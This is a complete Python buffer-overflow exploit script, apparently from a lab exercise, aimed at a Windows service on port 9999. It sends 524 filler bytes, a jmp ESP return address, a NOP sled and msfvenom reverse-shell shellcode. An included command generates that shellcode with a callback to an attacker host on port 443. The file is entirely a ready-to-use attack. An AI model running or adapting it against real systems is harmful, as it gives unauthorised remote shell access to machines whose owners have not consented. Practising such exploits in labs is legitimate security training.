#!/usr/bin/python3

import os
import sys
import socket
import signal
from struct import pack

host = "192.168.0.26"
port = 9999

def signal_handler(sig, frame):				# CTRL + C
    print('\n[+] Saliendo del exploit...')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

offset = 524
before_eip = b"A" * offset
eip = pack("<I", 0x311712F3) # jmp ESP
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.27 LPORT=443 --platform windows -a x86 -b "\x00" EXITFUNC=thread -f c

shellcode = (b"\xdb\xc4\xd9\x74\x24\xf4\x5b\xbf\x23\x83\x59\x38\x2b\xc9"
b"\xb1\x52\x83\xeb\xfc\x31\x7b\x13\x03\x58\x90\xbb\xcd\x62"
b"\x7e\xb9\x2e\x9a\x7f\xde\xa7\x7f\x4e\xde\xdc\xf4\xe1\xee"
b"\x97\x58\x0e\x84\xfa\x48\x85\xe8\xd2\x7f\x2e\x46\x05\x4e"
b"\xaf\xfb\x75\xd1\x33\x06\xaa\x31\x0d\xc9\xbf\x30\x4a\x34"
b"\x4d\x60\x03\x32\xe0\x94\x20\x0e\x39\x1f\x7a\x9e\x39\xfc"
b"\xcb\xa1\x68\x53\x47\xf8\xaa\x52\x84\x70\xe3\x4c\xc9\xbd"
b"\xbd\xe7\x39\x49\x3c\x21\x70\xb2\x93\x0c\xbc\x41\xed\x49"
b"\x7b\xba\x98\xa3\x7f\x47\x9b\x70\xfd\x93\x2e\x62\xa5\x50"
b"\x88\x4e\x57\xb4\x4f\x05\x5b\x71\x1b\x41\x78\x84\xc8\xfa"
b"\x84\x0d\xef\x2c\x0d\x55\xd4\xe8\x55\x0d\x75\xa9\x33\xe0"
b"\x8a\xa9\x9b\x5d\x2f\xa2\x36\x89\x42\xe9\x5e\x7e\x6f\x11"
b"\x9f\xe8\xf8\x62\xad\xb7\x52\xec\x9d\x30\x7d\xeb\xe2\x6a"
b"\x39\x63\x1d\x95\x3a\xaa\xda\xc1\x6a\xc4\xcb\x69\xe1\x14"
b"\xf3\xbf\xa6\x44\x5b\x10\x07\x34\x1b\xc0\xef\x5e\x94\x3f"
b"\x0f\x61\x7e\x28\xba\x98\xe9\x97\x93\xa2\xf2\x7f\xe6\xa2"
b"\x05\x3b\x6f\x44\x6f\x2b\x26\xdf\x18\xd2\x63\xab\xb9\x1b"
b"\xbe\xd6\xfa\x90\x4d\x27\xb4\x50\x3b\x3b\x21\x91\x76\x61"
b"\xe4\xae\xac\x0d\x6a\x3c\x2b\xcd\xe5\x5d\xe4\x9a\xa2\x90"
b"\xfd\x4e\x5f\x8a\x57\x6c\xa2\x4a\x9f\x34\x79\xaf\x1e\xb5"
b"\x0c\x8b\x04\xa5\xc8\x14\x01\x91\x84\x42\xdf\x4f\x63\x3d"
b"\x91\x39\x3d\x92\x7b\xad\xb8\xd8\xbb\xab\xc4\x34\x4a\x53"
b"\x74\xe1\x0b\x6c\xb9\x65\x9c\x15\xa7\x15\x63\xcc\x63\x35"
b"\x86\xc4\x99\xde\x1f\x8d\x23\x83\x9f\x78\x67\xba\x23\x88"
b"\x18\x39\x3b\xf9\x1d\x05\xfb\x12\x6c\x16\x6e\x14\xc3\x17"
b"\xbb")

payload = before_eip + eip + b"\x90"*20 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print (s.recv(1024).decode())
print ("[+] Send Exploit...")
s.send(payload)
print (s.recv(1024).decode())
s.close()